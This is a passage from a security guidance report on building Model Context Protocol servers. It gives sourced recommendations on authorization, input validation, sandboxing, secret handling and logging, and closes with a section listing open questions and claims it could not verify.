2. Use vetted libraries for token validation — from "Do not implement token validation or authorization logic by yourself" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).
3. If you proxy to a third-party API, implement per-client consent — from "MCP proxy servers **MUST** implement per-client consent" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).
4. Treat state handles as names, not capabilities, and bind them to the verified user — from "MUST NOT treat possession of a state handle as authentication" and "keying stored state as `<user_id>:<handle>`" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).
5. Validate all tool inputs, sanitize outputs, rate limit invocations, and enforce access controls — from "Servers **MUST**: Validate all tool inputs; Implement proper access controls; Rate limit tool invocations; Sanitize tool outputs" ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md)).
6. Return validation failures as tool execution errors so the model can self-correct — from "Tool Execution Errors should be used for all tool argument validation failures" ([SEP-1303](https://modelcontextprotocol.io/seps/1303-input-validation-errors-as-tool-execution-errors)).
7. Never shell out to open URLs or run commands with untrusted input — from "MCP clients **MUST NOT** use shell commands ... to open URLs" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).
8. Run local servers sandboxed with minimal privileges — from "Execute MCP server commands in a sandboxed environment with minimal default privileges" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).
9. Use progressive, least-privilege scopes — from "Implement a progressive, least-privilege scope model" ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)).
10. Store secrets in a manager, never in source, and use short-lived tokens — from "Store all secrets in a proper secret manager, not in source control" and "Authorization servers **SHOULD** issue short-lived access tokens" ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md), [Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).
11. Never log credentials, tokens, or PII — from "Log messages **MUST NOT** contain: Credentials or secrets; Personal identifying information" ([Logging](https://modelcontextprotocol.io/specification/2026-07-28/server/utilities/logging.md)).
12. Publish signed, pinned, reproducible artifacts and maintain provenance — from "Require signed releases and verified publisher signals for any MCP component" ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/)).

## 15. Open questions and gaps

**UNKNOWN.** The retrieved MCP specification text does not define a normative path-traversal control; the only retrieved quantification is the Rank C OWASP figure "82 percent path traversal exposure". A server author must therefore derive path handling from general secure-coding practice, not from an MCP-specific rule.

**UNKNOWN.** No retrieved source defines a normative MCP-specific command-injection control beyond the client-side URL rule and the general "Validate all tool inputs" requirement. The server-side parameterization guidance is a Rank C recommendation.

**PLAUSIBLE NOT VERIFIED.** The OWASP MCP Top 10 categories (MCP01–MCP10) are presented by a vendor guide as "OWASP's first dedicated Top 10 project for Model Context Protocol implementations"; the primary OWASP project page for that list was not retrieved, so the exact category wording should be confirmed against the OWASP source before being cited as authoritative.

**PLAUSIBLE NOT VERIFIED.** The claim that "Palo Alto Networks Unit 42 measured a 78.3 percent attack success rate when five MCP servers were connected to a single AI agent" appears only in the Rank C Cycode guide; the underlying Unit 42 report was not retrieved.
